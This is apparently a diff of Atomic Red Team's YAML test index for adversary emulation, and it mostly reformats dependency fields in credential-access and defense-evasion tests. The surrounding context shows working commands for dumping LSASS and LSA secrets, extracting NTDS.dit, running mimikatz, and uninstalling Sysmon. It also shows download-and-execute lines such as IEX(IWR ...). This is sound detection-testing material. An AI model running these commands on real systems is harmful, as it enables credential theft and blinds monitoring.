-      - description: T1056.004x64.dll must exist on disk at specified location (#{file_name})
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1056.004x64.dll must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
       executor:
@@ -16959,10 +17167,14 @@ credential-access:
           default: "$env:TEMP"
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Modified Sysinternals must be located at #{file_path}'
+      - description: 'Modified Sysinternals must be located at #{file_path}
+
+'
         prereq_command: 'if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit
-          1}'
-        get_prereq_command: |-
+          1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
           Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
@@ -17602,11 +17814,17 @@ credential-access:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Computer must be domain joined
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
           {exit 0} else {exit 1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: 'findstr /S cpassword %logonserver%\sysvol\*.xml
 
@@ -17633,17 +17851,27 @@ credential-access:
           default: PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
-        prereq_command: if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1
+      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+
+'
+        prereq_command: 'if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1
           }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
           Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
-      - description: Computer must be domain joined
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
           {exit 0} else {exit 1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           . #{gpp_script_path}
@@ -18143,7 +18371,11 @@ credential-access:
     atomic_tests:
     - name: Dumping LSA Secrets
       auto_generated_guid: 55295ab0-a703-433b-9ca4-ae13807de12f
-      description: Dump secrets key from Windows registry
+      description: |
+        Dump secrets key from Windows registry
+        When successful, the dumped file will be written to $env:Temp\secrets.
+        Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
+        https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.
       supported_platforms:
       - windows
       input_arguments:
@@ -18273,10 +18505,14 @@ credential-access:
           default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
       dependency_executor_name: powershell
       dependencies:
-      - description: Windows Credential Editor must exist on disk at specified location
+      - description: 'Windows Credential Editor must exist on disk at specified location
           (#{wce_exe})
-        prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
           IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
@@ -18311,10 +18547,14 @@ credential-access:
           default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: ProcDump tool from Sysinternals must exist on disk at specified
+      - description: 'ProcDump tool from Sysinternals must exist on disk at specified
           location (#{procdump_exe})
-        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
           Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
           New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
@@ -18361,9 +18601,14 @@ credential-access:
           default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})
-        prereq_command: 'if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Dumpert executable must exist on disk at specified location
+          (#{dumpert_exe})
+
+'
+        prereq_command: 'if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
           Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
       executor:
@@ -18411,18 +18656,28 @@ credential-access:
           default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})
-        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+
+'
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
-      - description: Lsass dump must exist at specified location (#{input_file})
-        prereq_command: 'cmd /c "if not exist #{input_file} (exit /b 1)"'
-        get_prereq_command: Write-Host "Create the lsass dump manually using the steps
-          in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
+      - description: 'Lsass dump must exist at specified location (#{input_file})
+
+'
+        prereq_command: 'cmd /c "if not exist #{input_file} (exit /b 1)"
+
+'
+        get_prereq_command: 'Write-Host "Create the lsass dump manually using the
+          steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
+
+'
       executor:
         command: '#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
           full" exit
@@ -18442,15 +18697,33 @@ credential-access:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Computer must have python 3 installed
-        prereq_command: if (python --version) {exit 0} else {exit 1}
-        get_prereq_command: echo "Python 3 must be installed manually"
-      - description: Computer must have pip installed
-        prereq_command: if (pip3 -V) {exit 0} else {exit 1}
-        get_prereq_command: echo "PIP must be installed manually"
-      - description: pypykatz must be installed and part of PATH
-        prereq_command: if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-        get_prereq_command: pip3 install pypykatz
+      - description: 'Computer must have python 3 installed
+
+'
+        prereq_command: 'if (python --version) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "Python 3 must be installed manually"
+
+'
+      - description: 'Computer must have pip installed
+
+'
+        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "PIP must be installed manually"
+
+'
+      - description: 'pypykatz must be installed and part of PATH
+
+'
+        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'pip3 install pypykatz
+
+'
       executor:
         command: 'pypykatz live lsa
 
@@ -18655,11 +18928,17 @@ credential-access:
           type: String
           default: 'C:'
       dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+      - description: 'Target must be a Domain Controller
+
+'
+        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
           ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+
+'
+        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
+
+'
       executor:
         command: 'vssadmin.exe create shadow /for=#{drive_letter}
 
@@ -18688,18 +18967,36 @@ credential-access:
           type: Path
           default: C:\Windows\Temp
       dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+      - description: 'Target must be a Domain Controller
+
+'
+        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
           ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+
+'
+        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
-      - description: Volume shadow copy must exist
-        prereq_command: 'if not exist #{vsc_name} (exit /b 1)'
-        get_prereq_command: echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create
-          Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
-      - description: Extract path must exist
-        prereq_command: 'if not exist #{extract_path} (exit /b 1)'
-        get_prereq_command: 'mkdir #{extract_path}'
+
+'
+      - description: 'Volume shadow copy must exist
+
+'
+        prereq_command: 'if not exist #{vsc_name} (exit /b 1)
+
+'
+        get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
+          Volume Shadow Copy with NTDS.dit''" to fulfuill this requirement
+
+'
+      - description: 'Extract path must exist
+
+'
+        prereq_command: 'if not exist #{extract_path} (exit /b 1)
+
+'
+        get_prereq_command: 'mkdir #{extract_path}
+
+'
       executor:
         command: |
           copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
@@ -18729,11 +19026,17 @@ credential-access:
           type: Path
           default: C:\Windows\Temp\ntds_T1003
       dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+      - description: 'Target must be a Domain Controller
+
+'
+        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
           ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+
+'
+        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
+
+'
       executor:
         command: |
           mkdir #{output_folder}
@@ -18757,11 +19060,17 @@ credential-access:
           type: String
           default: 'C:'
       dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+      - description: 'Target must be a Domain Controller
+
+'
+        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
           ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+
+'
+        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
+
+'
       executor:
         command: 'wmic shadowcopy call create Volume=#{drive_letter}
 
@@ -18878,11 +19187,17 @@ credential-access:
           default: ens33
       dependency_executor_name: bash
       dependencies:
-      - description: Check if at least one of the tools are installed on the machine.
-        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
-          tshark)" ]; then exit 1; else exit 0; fi;
-        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+      - description: 'Check if at least one of the tools are installed on the machine.
+
+'
+        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
+          -v tshark)" ]; then exit 1; else exit 0; fi;
+
+'
+        get_prereq_command: 'echo "Install tcpdump and/or tshark for the test to run.";
           exit 1;
+
+'
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -18904,11 +19219,17 @@ credential-access:
           default: en0A
       dependency_executor_name: bash
       dependencies:
-      - description: Check if at least one of the tools are installed on the machine.
-        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
-          tshark)" ]; then exit 1; else exit 0; fi;
-        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+      - description: 'Check if at least one of the tools are installed on the machine.
+
+'
+        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
+          -v tshark)" ]; then exit 1; else exit 0; fi;
+
+'
+        get_prereq_command: 'echo "Install tcpdump and/or tshark for the test to run.";
           exit 1;
+
+'
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
           tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
@@ -19097,9 +19418,13 @@ credential-access:
           default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Gsecdump must exist on disk at specified location (#{gsecdump_exe})
-        prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+
+'
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
           IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
@@ -19273,11 +19598,17 @@ credential-access:
           default: PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: AtomicPasswordFilter.dll must exist on disk at specified location
+      - description: 'AtomicPasswordFilter.dll must exist on disk at specified location
           (#{input_dll})
-        prereq_command: 'if (Test-Path #{input_dll}) {exit 0} else {exit 1}'
-        get_prereq_command: Write-Host "You must provide your own password filter
+
+'
+        prereq_command: 'if (Test-Path #{input_dll}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host "You must provide your own password filter
           dll"
+
+'
       executor:
         command: |
           $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
@@ -19491,9 +19822,15 @@ credential-access:
           type: string
           default: Spring2020
       dependencies:
-      - description: List of domain users to password spray must exits at %temp%\users.txt
-        prereq_command: if not exist %temp%\users.txt (exit /b 1)
-        get_prereq_command: PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+      - description: 'List of domain users to password spray must exits at %temp%\users.txt
+
+'
+        prereq_command: 'if not exist %temp%\users.txt (exit /b 1)
+
+'
+        get_prereq_command: 'PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+
+'
       executor:
         name: command_prompt
         elevation_required: false
@@ -19864,15 +20201,33 @@ credential-access:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Computer must have python 3 installed
-        prereq_command: if (python --version) {exit 0} else {exit 1}
-        get_prereq_command: echo "Python 3 must be installed manually"
-      - description: Computer must have pip installed
-        prereq_command: if (pip3 -V) {exit 0} else {exit 1}
-        get_prereq_command: echo "PIP must be installed manually"
-      - description: pypykatz must be installed and part of PATH
-        prereq_command: if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-        get_prereq_command: pip3 install pypykatz
+      - description: 'Computer must have python 3 installed
+
+'
+        prereq_command: 'if (python --version) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "Python 3 must be installed manually"
+
+'
+      - description: 'Computer must have pip installed
+
+'
+        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "PIP must be installed manually"
+
+'
+      - description: 'pypykatz must be installed and part of PATH
+
+'
+        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'pip3 install pypykatz
+
+'
       executor:
         command: 'pypykatz live registry
 
@@ -21008,9 +21363,15 @@ defense-evasion:
           default: "/tmp/evil-binary"
       dependency_executor_name: bash
       dependencies:
-      - description: The binary must exist on disk at specified location (#{file_to_pad})
-        prereq_command: 'if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: 'cp /bin/ls #{file_to_pad}'
+      - description: 'The binary must exist on disk at specified location (#{file_to_pad})
+
+'
+        prereq_command: 'if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'cp /bin/ls #{file_to_pad}
+
+'
       executor:
         command: 'dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}
 
@@ -21415,9 +21776,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.003\src\T1218.003.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: INF file must exist on disk at specified location (#{inf_file_path})
-        prereq_command: 'if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'INF file must exist on disk at specified location (#{inf_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" -OutFile "#{inf_file_path}"
       executor:
@@ -21440,9 +21805,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: INF file must exist on disk at specified location (#{inf_file_uac})
-        prereq_command: 'if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'INF file must exist on disk at specified location (#{inf_file_uac})
+
+'
+        prereq_command: 'if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
       executor:
@@ -22070,9 +22439,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1027.004\src\calc.cs
       dependency_executor_name: powershell
       dependencies:
-      - description: C# file must exist on disk at specified location (#{input_file})
-        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'C# file must exist on disk at specified location (#{input_file})
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs" -OutFile "#{input_file}"
       executor:
@@ -22102,10 +22475,16 @@ defense-evasion:
           default: PathToAtomicsFolder\T1027.004\bin\T1027.004_DynamicCompile.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: exe file must exist on disk at specified location (#{input_file})
-        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}'
+      - description: 'exe file must exist on disk at specified location (#{input_file})
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
         get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe
-          -OutFile #{input_file}'
+          -OutFile #{input_file}
+
+'
       executor:
         command: 'Invoke-Expression #{input_file}
 
@@ -22187,9 +22566,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm
       dependency_executor_name: powershell
       dependencies:
-      - description: The payload must exist on disk at specified location (#{local_chm_file})
-        prereq_command: 'if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'The payload must exist on disk at specified location (#{local_chm_file})
+
+'
+        prereq_command: 'if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
       executor:
@@ -22352,9 +22735,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.002\bin\calc.cpl
       dependency_executor_name: powershell
       dependencies:
-      - description: Cpl file must exist on disk at specified location (#{cpl_file_path})
-        prereq_command: 'if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Cpl file must exist on disk at specified location (#{cpl_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl" -OutFile "#{cpl_file_path}"
       executor:
@@ -22699,9 +23086,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
-        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Gup.exe binary must exist on disk at specified location (#{gup_executable})
+
+'
+        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
@@ -23381,24 +23772,36 @@ defense-evasion:
           default: SysmonDrv
       dependency_executor_name: powershell
       dependencies:
-      - description: Sysmon must be downloaded
-        prereq_command: if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon
+      - description: 'Sysmon must be downloaded
+
+'
+        prereq_command: 'if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon
           2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else {
           exit 1 }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
           Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
           Remove-Item $env:TEMP\Sysmon.zip -Force
-      - description: sysmon must be Installed
-        prereq_command: if(sc.exe query sysmon | findstr sysmon) { exit 0 } else {
-          exit 1 }
-        get_prereq_command: |-
+      - description: 'sysmon must be Installed
+
+'
+        prereq_command: 'if(sc.exe query sysmon | findstr sysmon) { exit 0 } else
+          { exit 1 }
+
+'
+        get_prereq_command: |
           if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
           { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
-      - description: sysmon filter must be loaded
+      - description: 'sysmon filter must be loaded
+
+'
         prereq_command: 'if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0
-          } else { exit 1 }'
-        get_prereq_command: |-
+          } else { exit 1 }
+
+'
+        get_prereq_command: |
           sysmon -u
           sysmon -accepteula -i
       executor:
@@ -23427,17 +23830,27 @@ defense-evasion:
           default: PathToAtomicsFolder\T1562.001\bin\sysmon.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Sysmon executable must be available
-        prereq_command: if(cmd /c where sysmon) {exit 0} else {exit 1}
-        get_prereq_command: |-
+      - description: 'Sysmon executable must be available
+
+'
+        prereq_command: 'if(cmd /c where sysmon) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
           New-Item -ItemType Directory $parentpath -Force | Out-Null
           Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
           Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
           if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
-      - description: Sysmon must be installed
-        prereq_command: if(cmd /c sc query sysmon) { exit 0} else { exit 1}
-        get_prereq_command: cmd /c sysmon -i -accepteula
+      - description: 'Sysmon must be installed
+
+'
+        prereq_command: 'if(cmd /c sc query sysmon) { exit 0} else { exit 1}
+
+'
+        get_prereq_command: 'cmd /c sysmon -i -accepteula
+
+'
       executor:
         command: 'sysmon -u
 
@@ -24490,9 +24903,16 @@ defense-evasion:
           default: "%temp%\\deleteme_T1551.004"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: The file to delete must exist on disk at specified location (#{file_to_delete})
-        prereq_command: IF EXIST "#{file_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
-        get_prereq_command: 'echo deleteme_T1551.004 >> #{file_to_delete}'
+      - description: 'The file to delete must exist on disk at specified location
+          (#{file_to_delete})
+
+'
+        prereq_command: 'IF EXIST "#{file_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'echo deleteme_T1551.004 >> #{file_to_delete}
+
+'
       executor:
         command: 'del /f #{file_to_delete}
 
@@ -24513,9 +24933,16 @@ defense-evasion:
           default: "%temp%\\deleteme_T1551.004"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: The file to delete must exist on disk at specified location (#{folder_to_delete})
-        prereq_command: IF EXIST "#{folder_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
-        get_prereq_command: 'mkdir #{folder_to_delete}'
+      - description: 'The file to delete must exist on disk at specified location
+          (#{folder_to_delete})
+
+'
+        prereq_command: 'IF EXIST "#{folder_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'mkdir #{folder_to_delete}
+
+'
       executor:
         command: 'rmdir /s /q #{folder_to_delete}
 
@@ -24538,9 +24965,16 @@ defense-evasion:
           default: "$env:TEMP\\deleteme_T1551.004"
       dependency_executor_name: powershell
       dependencies:
-      - description: The file to delete must exist on disk at specified location (#{file_to_delete})
-        prereq_command: 'if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}'
-        get_prereq_command: 'New-Item -Path #{file_to_delete} | Out-Null'
+      - description: 'The file to delete must exist on disk at specified location
+          (#{file_to_delete})
+
+'
+        prereq_command: 'if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'New-Item -Path #{file_to_delete} | Out-Null
+
+'
       executor:
         command: 'Remove-Item -path #{file_to_delete}
 
@@ -24563,11 +24997,17 @@ defense-evasion:
           default: "$env:TEMP\\deleteme_folder_T1551.004"
       dependency_executor_name: powershell
       dependencies:
-      - description: The folder to delete must exist on disk at specified location
+      - description: 'The folder to delete must exist on disk at specified location
           (#{folder_to_delete})
-        prereq_command: 'if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}'
+
+'
+        prereq_command: 'if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}
+
+'
         get_prereq_command: 'New-Item -Path #{folder_to_delete} -Type Directory |
-          Out-Null'
+          Out-Null
+
+'
       executor:
         command: 'Remove-Item -Path #{folder_to_delete} -Recurse
 
@@ -24619,11 +25059,17 @@ defense-evasion:
           default: "$env:TEMP\\TeamViewer_54.log"
       dependency_executor_name: powershell
       dependencies:
-      - description: The folder to delete must exist on disk at specified location
+      - description: 'The folder to delete must exist on disk at specified location
           (#{teamviewer_log_file})
+
+'
         prereq_command: 'if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit
-          1}'
-        get_prereq_command: 'New-Item -Path #{teamviewer_log_file} | Out-Null'
+          1}
+
+'
+        get_prereq_command: 'New-Item -Path #{teamviewer_log_file} | Out-Null
+
+'
       executor:
         command: 'Remove-Item #{teamviewer_log_file}
 
